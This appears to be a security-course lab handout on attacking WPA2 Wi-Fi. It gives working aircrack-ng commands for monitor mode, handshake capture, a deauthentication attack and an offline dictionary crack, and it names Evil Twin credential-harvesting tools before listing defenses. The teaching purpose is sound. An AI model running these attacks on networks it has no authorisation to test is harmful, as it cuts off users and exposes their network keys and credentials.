# Lab 06: Wireless Security

## Lab Objectives
- Understand 802.11 frame types and monitor mode.
- Capture a WPA2 4-way handshake.
- Perform offline cracking of WPA2.
- Understand Evil Twin attacks.

## Hardware Requirements
- Kali Linux (Native or VM).
- A USB wireless adapter compatible with Monitor Mode and Packet Injection (e.g., ALFA AWUS036NHA).

## 1. Monitor Mode
Put your wireless adapter into monitor mode.
```bash
iwconfig
airmon-ng check kill   # Kills interfering processes
airmon-ng start wlan0
```
Your interface is now `wlan0mon`.

## 2. Wireless Reconnaissance
Find your target AP (Access Point).
```bash
airodump-ng wlan0mon
```
Note the BSSID (MAC Address) and Channel of the target network.

## 3. Capturing the Handshake
Listen on the specific channel and save the output.
```bash
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture wlan0mon
```

## 4. Forcing a Handshake (Deauth Attack)
In a new terminal, forge deauthentication packets to kick a client off. When they auto-reconnect, you capture the handshake.
```bash
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```
Watch the `airodump-ng` terminal. You should see `WPA handshake: AA:BB:CC:DD:EE:FF` appear in the top right.

## 5. Offline Dictionary Attack
Now you can stop monitor mode (`airmon-ng stop wlan0mon`). Crack the `.cap` file using Aircrack-ng.
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF wpa_capture-01.cap
```

## 6. Evil Twin Concept
An Evil Twin involves setting up a rogue AP with the exact same SSID as the target network. If your signal is stronger, devices will connect to you instead. Tools like `wifiphisher` or `fluxion` automate this process, deploying captive portals to harvest credentials.

## Defense Strategies
- Use complex, long WPA2 passphrases (not in dictionaries).
- Upgrade to WPA3 which prevents offline dictionary attacks.
- Use Enterprise WPA2 (802.1X) which requires individual user credentials rather than a shared key.
